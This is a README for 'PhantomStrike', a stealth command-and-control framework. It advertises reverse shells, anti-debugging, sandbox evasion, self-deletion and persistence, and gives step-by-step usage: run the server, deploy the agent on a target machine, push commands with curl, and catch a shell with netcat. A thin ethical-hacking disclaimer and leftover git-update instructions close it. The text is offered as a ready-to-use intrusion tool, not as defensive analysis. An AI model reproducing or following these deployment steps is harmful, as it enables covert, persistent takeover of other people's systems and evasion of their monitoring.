---

██████╗ ██╗  ██╗ █████╗ ███╗   ███╗████████╗ ██████╗ ███████╗
██╔══██╗██║  ██║██╔══██╗████╗ ████║╚══██╔══╝██╔═══██╗██╔════╝
██████╔╝███████║███████║██╔████╔██║   ██║   ██║   ██║███████╗
██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║   ██║   ██║   ██║╚════██║
██║     ██║  ██║██║  ██║██║ ╚═╝ ██║   ██║   ╚██████╔╝███████║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝    ╚═════╝ ╚══════╝

PhantomStrike - Stealth C2 Framework

🚀 Advanced post-exploitation framework for stealth persistence, privilege escalation, and remote control.


---

🔧 Features

✅ AES Encryption – Secure communication
✅ Stealth Mode – Hides execution traces
✅ Anti-Debugging – Evades analysis tools
✅ Reverse Shell – Full remote access
✅ Fileless Execution – Runs in memory
✅ Self-Delete – Auto-removes after execution
✅ Persistence Mode – Maintains access after reboots


---

📌 Installation

1️⃣ Clone the Repo

git clone https://github.com/Akkaiaj/PhantomStrike.git
cd PhantomStrike

2️⃣ Install Dependencies

pip install -r requirements.txt


---

🚀 Usage

1️⃣ Start the C2 Server (Attacker Machine)

python3 phantom_c2.py

📌 This will start the Flask-based C2 server.


---

2️⃣ Deploy the Agent (Target Machine)

Run the agent on the target system:

python3 phantom_agent.py

📌 This will:

Connect to the C2 server

Execute commands sent from C2

Start a reverse shell



---

🛠️ Sending Commands

From the C2 server, you can send commands to the agent:

curl -X POST http://your-server-ip:5000/command -H "Content-Type: application/json" -d '{"command": "whoami"}'

📌 The agent will execute this command and send back the result.


---

🔥 Reverse Shell Usage

Once the agent is running, connect to the reverse shell from the C2 machine:

nc -lvnp 4444

📌 Now you have full control over the target system!


---

🕵️‍♂️ Evasion & Persistence

Anti-Debugging: Detects debuggers and terminates itself.

Self-Delete: Deletes itself after execution to remove traces.

Persistence Mode: Runs at startup for continued access.



---

🛡️ Defensive Measures

Uses AES encryption to secure command communication

Evades sandbox detection & monitoring tools

Implements polymorphic obfuscation for stealth



---

💰 Donate & Support

If you find PhantomStrike useful, consider donating:

BTC: bc1q0ruwrc4gs465xvu6tcn24h62pclt96sh2yv8pq
ETH: 0x69B6F3aA9F470d4cBD93CDC4c0A887C0787CEf9B
SOL: Gk6CmvvS6fi1Nfnu7QEEneshbLkmaE5Ue8sBzxz91D3q


---

💀 Disclaimer

This tool is for educational and ethical hacking purposes only. Unauthorized use is illegal.


---

✅ Now update your GitHub repo with this README:

cd ~/PhantomStrike
nano README.md  # Replace with new content
git add README.md
git commit -m "Updated README with detailed usage and ASCII art"
git push origin main
